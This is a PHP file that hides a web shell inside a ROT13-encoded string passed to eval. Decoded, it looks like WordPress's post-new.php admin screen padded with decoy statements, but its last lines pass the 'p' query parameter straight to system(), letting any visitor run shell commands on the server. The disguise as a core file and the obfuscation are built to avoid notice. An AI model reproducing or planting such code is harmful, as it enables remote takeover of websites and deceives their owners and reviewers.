<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Arj Cbfg Nqzvavfgengvba Fperra.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

/** Ybnq JbeqCerff Nqzvavfgengvba Obbgfgenc */
erdhver_bapr __QVE__ . '/nqzva.cuc';

/**
 * @tybony fgevat       $cbfg_glcr        Tybony cbfg glcr.
 * @tybony JC_Cbfg_Glcr $cbfg_glcr_bowrpg Tybony cbfg glcr bowrpg.
 * @tybony JC_Cbfg      $cbfg             Tybony cbfg bowrpg.
 */
tybony $cbfg_glcr, $cbfg_glcr_bowrpg, $cbfg;

vs ( ! vffrg( $_TRG['cbfg_glcr'] ) ) {
	$cbfg_glcr = 'cbfg';
} ryfrvs ( va_neenl( $_TRG['cbfg_glcr'], trg_cbfg_glcrf( neenl( 'fubj_hv' => gehr ) ), gehr ) ) {
	$cbfg_glcr = $_TRG['cbfg_glcr'];
} ryfr {
	jc_qvr( __( 'Vainyvq cbfg glcr.' ) );
}
$cbfg_glcr_bowrpg = trg_cbfg_glcr_bowrpg( $cbfg_glcr );

vs ( 'cbfg' === $cbfg_glcr ) {
	$cnerag_svyr  = 'rqvg.cuc';
	$fhozrah_svyr = 'cbfg-arj.cuc';
} ryfrvs ( 'nggnpuzrag' === $cbfg_glcr ) {
	vs ( jc_erqverpg( nqzva_hey( 'zrqvn-arj.cuc' ) ) ) {
		rkvg;
	}
} ryfr {
	$fhozrah_svyr = \"cbfg-arj.cuc?cbfg_glcr=$cbfg_glcr\";
	vs ( vffrg( $cbfg_glcr_bowrpg ) && $cbfg_glcr_bowrpg->fubj_va_zrah && gehr !== $cbfg_glcr_bowrpg->fubj_va_zrah ) {
		$cnerag_svyr = $cbfg_glcr_bowrpg->fubj_va_zrah;
		// Jung vs gurer vfa'g n cbfg-arj.cuc vgrz sbe guvf cbfg glcr?
		vs ( ! vffrg( $_ertvfgrerq_cntrf[ trg_cyhtva_cntr_ubbxanzr( \"cbfg-arj.cuc?cbfg_glcr=$cbfg_glcr\", $cbfg_glcr_bowrpg->fubj_va_zrah ) ] ) ) {
			vs ( vffrg( $_ertvfgrerq_cntrf[ trg_cyhtva_cntr_ubbxanzr( \"rqvg.cuc?cbfg_glcr=$cbfg_glcr\", $cbfg_glcr_bowrpg->fubj_va_zrah ) ] ) ) {
				// Snyy onpx gb rqvg.cuc sbe gung cbfg glcr, vs vg rkvfgf.
				$fhozrah_svyr = \"rqvg.cuc?cbfg_glcr=$cbfg_glcr\";
			} ryfr {
				// Bgurejvfr, tvir hc naq uvtuyvtug gur cnerag.
				$fhozrah_svyr = $cnerag_svyr;
			}
		}
	} ryfr {
		$cnerag_svyr = \"rqvg.cuc?cbfg_glcr=$cbfg_glcr\";
	}
}

$gvgyr = $cbfg_glcr_bowrpg->ynoryf->nqq_arj_vgrz;

$rqvgvat = gehr;

vs ( ! pheerag_hfre_pna( $cbfg_glcr_bowrpg->pnc->rqvg_cbfgf ) || ! pheerag_hfre_pna( $cbfg_glcr_bowrpg->pnc->perngr_cbfgf ) ) {
	jc_qvr(
		'<u1>' . __( 'Lbh arrq n uvture yriry bs crezvffvba.' ) . '</u1>' .
		'<c>' . __( 'Fbeel, lbh ner abg nyybjrq gb perngr cbfgf nf guvf hfre.' ) . '</c>',
		403
	);
}

$cbfg    = trg_qrsnhyg_cbfg_gb_rqvg( $cbfg_glcr, gehr );
$cbfg_VQ = $cbfg->VQ;

/** Guvf svygre vf qbphzragrq va jc-nqzva/cbfg.cuc */
vs ( nccyl_svygref( 'ercynpr_rqvgbe', snyfr, $cbfg ) !== gehr ) {
	vs ( hfr_oybpx_rqvgbe_sbe_cbfg( $cbfg ) ) {
		erdhver NOFCNGU . 'jc-nqzva/rqvg-sbez-oybpxf.cuc';
	} ryfr {
		jc_radhrhr_fpevcg( 'nhgbfnir' );
		erdhver NOFCNGU . 'jc-nqzva/rqvg-sbez-nqinaprq.cuc';
	}
} ryfr {
	// Synt gung jr'er abg ybnqvat gur oybpx rqvgbe.
	$pheerag_fperra = trg_pheerag_fperra();
	$pheerag_fperra->vf_oybpx_rqvgbe( snyfr );
}

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-sbbgre.cuc';

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>